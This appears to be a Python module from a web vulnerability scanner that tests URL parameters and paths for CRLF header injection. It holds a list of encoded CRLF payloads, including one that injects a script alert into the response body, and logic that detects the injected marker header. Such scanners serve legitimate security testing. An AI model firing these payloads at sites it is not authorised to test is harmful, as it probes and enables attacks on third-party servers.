#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - CRLF Injection Module
Detects CRLF (Carriage Return Line Feed) injection vulnerabilities
that allow HTTP response splitting and header injection.
"""



from config import Payloads, Colors


class CRLFModule:
    """CRLF Injection Testing Module"""

    CRLF_PAYLOADS = Payloads.CRLF_PAYLOADS + [
        "%0d%0aX-Injected: crlf-test",
        "%0aX-Injected: crlf-test",
        "%0dX-Injected: crlf-test",
        "%0d%0a%0d%0a<script>alert('CRLF')</script>",
        "%%0d0a%0d%0aX-Injected: crlf-test",
        "%E5%98%8A%E5%98%8DX-Injected: crlf-test",
        "\r\nX-Injected: crlf-test",
        "\nX-Injected: crlf-test",
    ]

    INJECTED_HEADER = 'x-injected'
    COOKIE_MARKER = 'crlfinjection=true'

    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.name = "CRLF Injection"

    def test(self, url: str, method: str, param: str, value: str):
        """Test a parameter for CRLF injection."""
        for payload in self.CRLF_PAYLOADS:
            try:
                response = self.requester.request(
                    url, method, data={param: payload},
                    allow_redirects=False,
                )
                if not response:
                    continue

                # Check for injected headers
                if self._detect_crlf(response, payload):
                    from core.engine import Finding
                    finding = Finding(
                        technique="CRLF Injection",
                        url=url,
                        param=param,
                        payload=payload,
                        evidence=self._get_evidence(response),
                        severity='MEDIUM',
                        confidence=0.8,
                    )
                    self.engine.add_finding(finding)
                    return

            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'CRLF test error: {e}')}")

    def test_url(self, url: str):
        """Test URL-level CRLF injection via path/query."""
        for payload in self.CRLF_PAYLOADS[:4]:
            try:
                test_url = url.rstrip('/') + '/' + payload
                response = self.requester.request(
                    test_url, 'GET', allow_redirects=False,
                )
                if response and self._detect_crlf(response, payload):
                    from core.engine import Finding
                    finding = Finding(
                        technique="CRLF Injection (URL Path)",
                        url=url,
                        param='path',
                        payload=payload,
                        evidence=self._get_evidence(response),
                        severity='MEDIUM',
                        confidence=0.75,
                    )
                    self.engine.add_finding(finding)
                    return
            except Exception:
                pass

    def _detect_crlf(self, response, payload):
        """Check whether the injected header appears in the response."""
        # Check response headers for injected header
        for header_name, header_value in response.headers.items():
            if self.INJECTED_HEADER in header_name.lower():
                return True
            if 'crlf-test' in header_value.lower():
                return True

        # Check for Set-Cookie injection
        set_cookie = response.headers.get('Set-Cookie', '')
        if self.COOKIE_MARKER in set_cookie:
            return True

        # Check response body for HTTP response splitting
        if response.text:
            body_lower = response.text[:3000].lower()
            if 'x-injected: crlf-test' in body_lower:
                return True

        return False

    def _get_evidence(self, response):
        """Extract evidence from response headers."""
        evidence_parts = []
        for name, value in response.headers.items():
            name_lower = name.lower()
            if self.INJECTED_HEADER in name_lower or 'crlf' in value.lower():
                evidence_parts.append(f"{name}: {value}")
        if not evidence_parts:
            evidence_parts.append(f"Status: {response.status_code}")
        return '; '.join(evidence_parts)[:200]
